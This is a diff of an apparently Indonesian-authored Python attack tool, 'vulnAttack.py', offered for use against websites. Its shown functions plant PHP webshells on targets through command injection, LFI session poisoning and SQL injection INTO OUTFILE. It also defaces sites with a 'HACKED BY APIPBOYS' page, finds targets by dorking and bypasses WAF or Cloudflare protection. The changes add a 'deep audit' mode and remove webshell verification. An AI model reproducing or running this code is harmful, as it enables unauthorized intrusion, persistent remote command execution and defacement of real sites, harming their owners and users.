     def deploy_webshell(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
@@ -782,14 +908,14 @@ class VulnAttack:
         try:
             choice = input("[?] Number: ").strip()
             if not choice.isdigit():
-                print_progress("Invalid input. Please enter a number.", 'error')
+                print_progress("Invalid input.", 'error')
                 return
             idx = int(choice) - 1
             if idx < 0 or idx >= len(self.vulns):
                 print_progress("Invalid choice.", 'error')
                 return
             vuln = self.vulns[idx]
-        except Exception:
+        except:
             print_progress("Invalid choice.", 'error')
             return
 
@@ -803,17 +929,16 @@ class VulnAttack:
             try:
                 t_choice = input("[?] Choose template: ").strip()
                 if not t_choice.isdigit():
-                    print_progress("Invalid input. Please enter a number.", 'error')
+                    print_progress("Invalid input.", 'error')
                     return
                 t_idx = int(t_choice) - 1
                 if t_idx < 0 or t_idx >= len(templates):
                     print_progress("Invalid choice.", 'error')
                     return
                 shell_code = self.templates.templates[templates[t_idx]]
-            except Exception:
+            except:
                 shell_code = "<?php system($_GET['cmd']); ?>"
 
-        # Deploy logic (sama seperti sebelumnya)
         if vuln['type'] in ['RCE', 'Command Injection']:
             params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
             for param in params:
@@ -821,23 +946,16 @@ class VulnAttack:
                 r = self._request(test_url)
                 if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                     encoded = base64.b64encode(shell_code.encode()).decode()
-                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > shell.php"
+                    deploy_url = vuln['url'] + f"&{param}=printf '%s' '{encoded}' | base64 -d > shell.php"
                     self._request(deploy_url)
                     self.shell_url = urljoin(self.base_url, 'shell.php')
-                    if self.verify_webshell(self.shell_url):
-                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
-                    else:
-                        print_progress(f"Webshell deployed but not verified: {self.shell_url}", 'warning')
+                    print_progress(f"Webshell deployed: {self.shell_url}", 'success')
                     return
-            # Fallback
             encoded = base64.b64encode(shell_code.encode()).decode()
-            deploy_url = vuln['url'] + f"&cmd=echo {encoded} | base64 -d > shell.php"
+            deploy_url = vuln['url'] + f"&cmd=printf '%s' '{encoded}' | base64 -d > shell.php"
             self._request(deploy_url)
             self.shell_url = urljoin(self.base_url, 'shell.php')
-            if self.verify_webshell(self.shell_url):
-                print_progress(f"Webshell verified (fallback): {self.shell_url}", 'success')
-            else:
-                print_progress(f"Webshell deployed (fallback): {self.shell_url}", 'warning')
+            print_progress(f"Webshell deployed (fallback): {self.shell_url}", 'success')
 
         elif vuln['type'] == 'LFI':
             params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
@@ -848,42 +966,32 @@ class VulnAttack:
                     session_id = self.session.cookies.get('PHPSESSID', 'test')
                     poison = f"/tmp/sess_{session_id}"
                     encoded = base64.b64encode(shell_code.encode()).decode()
-                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php"
+                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=printf '%s' '{encoded}' | base64 -d > /tmp/shell.php"
                     self._request(deploy_url)
                     self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
-                    if self.verify_webshell(self.shell_url):
-                        print_progress(f"Webshell via LFI verified: {self.shell_url}", 'success')
-                    else:
-                        print_progress(f"Webshell via LFI deployed: {self.shell_url}", 'warning')
+                    print_progress(f"Webshell via LFI deployed: {self.shell_url}", 'success')
                     return
-            # Fallback
             session_id = self.session.cookies.get('PHPSESSID', 'test')
             poison = f"/tmp/sess_{session_id}"
             encoded = base64.b64encode(shell_code.encode()).decode()
-            deploy_url = vuln['url'] + f"&file={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php"
+            deploy_url = vuln['url'] + f"&file={poison}&cmd=printf '%s' '{encoded}' | base64 -d > /tmp/shell.php"
             self._request(deploy_url)
             self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
-            if self.verify_webshell(self.shell_url):
-                print_progress(f"Webshell via LFI verified (fallback): {self.shell_url}", 'success')
-            else:
-                print_progress(f"Webshell via LFI deployed (fallback): {self.shell_url}", 'warning')
+            print_progress(f"Webshell via LFI deployed (fallback): {self.shell_url}", 'success')
 
         elif vuln['type'] == 'SQLi':
             try:
-                shell_hex = ''.join(f'\\x{ord(c):02x}' for c in shell_code)
-                deploy_url = vuln['url'] + f"' UNION SELECT '{shell_hex}' INTO OUTFILE '/var/www/html/shell.php'-- -"
+                shell_hex = ''.join(f'{ord(c):02x}' for c in shell_code)
+                deploy_url = vuln['url'] + f"' UNION SELECT 0x{shell_hex} INTO OUTFILE '/var/www/html/shell.php'-- -"
                 self._request(deploy_url)
                 self.shell_url = urljoin(self.base_url, 'shell.php')
-                if self.verify_webshell(self.shell_url):
-                    print_progress(f"Webshell via SQLi verified: {self.shell_url}", 'success')
-                else:
-                    print_progress(f"Webshell via SQLi deployed: {self.shell_url}", 'warning')
-            except Exception:
-                print_progress("SQLi deploy failed, try manual.", 'warning')
+                print_progress(f"Webshell via SQLi deployed: {self.shell_url}", 'success')
+            except Exception as e:
+                print_progress(f"SQLi deploy failed: {e}", 'warning')
         else:
             print_progress("Cannot deploy with this vuln type.", 'warning')
 
-    # ========== DEFACE ==========
+    # ---------- DEFACE ----------
     def deface_website(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
@@ -895,14 +1003,14 @@ class VulnAttack:
         try:
             choice = input("[?] Number: ").strip()
             if not choice.isdigit():
-                print_progress("Invalid input. Please enter a number.", 'error')
+                print_progress("Invalid input.", 'error')
                 return
             idx = int(choice) - 1
             if idx < 0 or idx >= len(self.vulns):
                 print_progress("Invalid choice.", 'error')
                 return
             vuln = self.vulns[idx]
-        except Exception:
+        except:
             print_progress("Invalid choice.", 'error')
             return
 
@@ -916,14 +1024,14 @@ class VulnAttack:
             try:
                 t_choice = input("[?] Choose template: ").strip()
                 if not t_choice.isdigit():
-                    print_progress("Invalid input. Please enter a number.", 'error')
+                    print_progress("Invalid input.", 'error')
                     return
                 t_idx = int(t_choice) - 1
                 if t_idx < 0 or t_idx >= len(deface_templates):
                     print_progress("Invalid choice.", 'error')
                     return
                 deface_content = self.templates.templates[deface_templates[t_idx]]
-            except Exception:
+            except:
                 deface_content = "<h1>HACKED BY APIPBOYS</h1>"
 
         if vuln['type'] in ['RCE', 'Command Injection']:
@@ -933,21 +1041,20 @@ class VulnAttack:
                 r = self._request(test_url)
                 if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                     encoded = base64.b64encode(deface_content.encode()).decode()
-                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > index.html"
+                    deploy_url = vuln['url'] + f"&{param}=printf '%s' '{encoded}' | base64 -d > index.html"
                     self._request(deploy_url)
                     self.deface_url = urljoin(self.base_url, 'index.html')
                     print_progress(f"Deface deployed: {self.deface_url}", 'success')
                     return
-            # Fallback
             encoded = base64.b64encode(deface_content.encode()).decode()
-            deploy_url = vuln['url'] + f"&cmd=echo {encoded} | base64 -d > index.html"
+            deploy_url = vuln['url'] + f"&cmd=printf '%s' '{encoded}' | base64 -d > index.html"
             self._request(deploy_url)
             self.deface_url = urljoin(self.base_url, 'index.html')
             print_progress(f"Deface (fallback): {self.deface_url}", 'success')
         else:
             print_progress("Deface only works with RCE or Command Injection.", 'warning')
 
-    # ========== GENERATE POC ==========
+    # ---------- GENERATE POC ----------
     def generate_poc(self):
         output_dir = CONFIG['output_dir']
         os.makedirs(output_dir, exist_ok=True)
@@ -963,6 +1070,8 @@ class VulnAttack:
         <ul>{''.join(f'<li><b>{v["type"]}</b> - {v["url"]}<br>Payload: <pre>{v["payload"]}</pre>Evidence: {v["evidence"]}</li>' for v in self.vulns)}</ul>
         <h2>Minor Vulnerabilities</h2>
         <ul>{''.join(f'<li><b>{f["type"]}</b> (Severity: {f["severity"]})<br>{f["description"]}</li>' for f in self.minor_vulns)}</ul>
+        <h2>Hidden Findings</h2>
+        <pre>{json.dumps(self.hidden_findings, indent=2)}</pre>
         <p>Webshell: {self.shell_url or 'N/A'}</p>
         <p>Deface: {self.deface_url or 'N/A'}</p>
         <h2>Deep Analysis</h2>
@@ -973,6 +1082,7 @@ class VulnAttack:
             f.write(html)
         print_progress(f"POC saved: {poc_file}", 'success')
 
+    # ---------- MENU ----------
     def display_menu(self):
         print_section("INTERACTIVE MENU")
         print("  [1] Deploy Webshell")
@@ -980,9 +1090,12 @@ class VulnAttack:
         print("  [3] Generate POC")
         print("  [4] Show Deep Analysis")
         print("  [5] Show Minor Vulnerabilities")
-        print("  [6] Scan Another Target")
-        print("  [7] Exit")
+        print("  [6] Deep Audit (Analisis Mendalam)")
+        print("  [7] Show Hidden Findings")
+        print("  [8] Scan Another Target")
+        print("  [9] Exit")
 
+    # ---------- RUN ----------
     def run(self):
         print(BANNER)
         print_progress(f"Target: {self.target}", 'info')
@@ -1013,7 +1126,7 @@ class VulnAttack:
 
         while True:
             self.display_menu()
-            opt = input("[?] Choose (1-7): ").strip()
+            opt = input("[?] Choose (1-9): ").strip()
             if opt == '1':
                 self.deploy_webshell()
             elif opt == '2':
@@ -1029,6 +1142,13 @@ class VulnAttack:
                 else:
                     print_progress("No minor vulnerabilities found.", 'info')
             elif opt == '6':
+                self.deep_audit()
+            elif opt == '7':
+                if self.hidden_findings:
+                    print(json.dumps(self.hidden_findings, indent=2))
+                else:
+                    print_progress("No hidden findings yet. Run Deep Audit first.", 'warning')
+            elif opt == '8':
                 new_target = input("[?] Enter new target URL: ").strip()
                 if new_target.startswith('http'):
                     self.target = new_target
@@ -1039,11 +1159,12 @@ class VulnAttack:
                     self.scanned_urls = set()
                     self.shell_url = None
                     self.deface_url = None
+                    self.hidden_findings = {}
                     self.run()
                     return
                 else:
                     print_progress("Invalid URL.", 'error')
-            elif opt == '7':
+            elif opt == '9':
                 print_progress("Exiting...", 'info')
                 break
             else:
@@ -1080,10 +1201,12 @@ def scan_single(target, pl, tl, use_proxy=False, bypass_waf=False):
 # MAIN
 # ================================================================
 def main():
-    print(BANNER)
+    for d in ['logs', 'results', 'config', 'templates', 'bypass', 'payloads']:
+        os.makedirs(d, exist_ok=True)
 
     bypass_waf = '--bypass-waf' in sys.argv
     use_proxy = '--proxy' in sys.argv
+    deep_scan = '--deep-scan' in sys.argv or '--audit' in sys.argv
 
     if '--delay' in sys.argv:
         try:
@@ -1099,7 +1222,11 @@ def main():
         except:
             pass
 
+    if '--menu' in sys.argv:
+        sys.argv = [sys.argv[0]]
+
     if len(sys.argv) < 2:
+        print(BANNER)
         print(f"""
 \033[92m[+] INSTALLATION COMPLETE!
 \033[93m[+] You can now run:
@@ -1108,12 +1235,12 @@ def main():
 \033[96m  python vulnAttack.py --list targets.txt --threads 20
 \033[96m  python vulnAttack.py --bypass-waf --dork ...
 \033[96m  python vulnAttack.py --proxy --list targets.txt
-\033[95m[+] MENU (saat menjalankan tanpa argumen):
-\033[97m  1. Scan target         (masukkan URL)
-\033[97m  2. Dorking             (masukkan dork)
-\033[97m  3. Scan list target    (masukkan file target)
-\033[97m  4. Help                (tampilkan bantuan)
-\033[97m  5. Exit                (keluar)
+\033[95m[+] MAIN MENU
+\033[97m  [1] Scan target         (masukkan URL)
+\033[97m  [2] Dorking             (masukkan dork)
+\033[97m  [3] Scan list target    (masukkan file target)
+\033[97m  [4] Help                (tampilkan bantuan)
+\033[97m  [5] Exit                (keluar)
 \033[0m""")
         while True:
             print_section("MAIN MENU")
@@ -1129,9 +1256,12 @@ def main():
                     target = 'http://' + target
                 use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                 bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
+                deep_opt = input("[?] Deep Scan? (y/n): ").strip().lower() == 'y'
                 pl = PayloadLoader()
                 tl = TemplateLoader()
                 scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_opt)
+                if deep_opt:
+                    scanner.deep_audit()
                 scanner.run()
             elif choice == '2':
                 dork = input("[?] Enter dork: ").strip()
@@ -1158,7 +1288,7 @@ def main():
                 else:
                     print_progress("File not found!", 'error')
             elif choice == '4':
-                print("Help:\n  python vulnAttack.py <target_url>\n  python vulnAttack.py --dork <dork>\n  python vulnAttack.py --list <file> [--threads N]\n  python vulnAttack.py --bypass-waf\n  python vulnAttack.py --proxy\n  python vulnAttack.py --delay N\n  python vulnAttack.py --output <dir>")
+                print("Help:\n  python vulnAttack.py <target_url>\n  python vulnAttack.py --dork <dork>\n  python vulnAttack.py --list <file> [--threads N]\n  python vulnAttack.py --bypass-waf\n  python vulnAttack.py --proxy\n  python vulnAttack.py --deep-scan\n  python vulnAttack.py --audit\n  python vulnAttack.py --delay N\n  python vulnAttack.py --output <dir>")
             elif choice == '5':
                 print_progress("Goodbye!", 'info')
                 sys.exit(0)
@@ -1210,8 +1340,11 @@ Options:
   --threads N     : Number of threads (default 10)
   --bypass-waf    : Enable WAF/Cloudflare bypass (requires cloudscraper)
   --proxy         : Enable proxy (requires config/proxy.txt)
+  --deep-scan     : Enable deep analysis (crawl deeper, hidden findings)
+  --audit         : Extreme audit (same as deep-scan)
   --delay N       : Delay between requests in seconds (default 1)
   --output <dir>  : Output directory (default: results)
+  --menu          : Force interactive menu
   --help          : Show this help
 """)
         sys.exit(0)
@@ -1221,6 +1354,8 @@ Options:
         if not target.startswith('http'):
             target = 'http://' + target
         scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf)
+        if deep_scan:
+            scanner.deep_audit()
         scanner.run()
 
 if __name__ == '__main__':
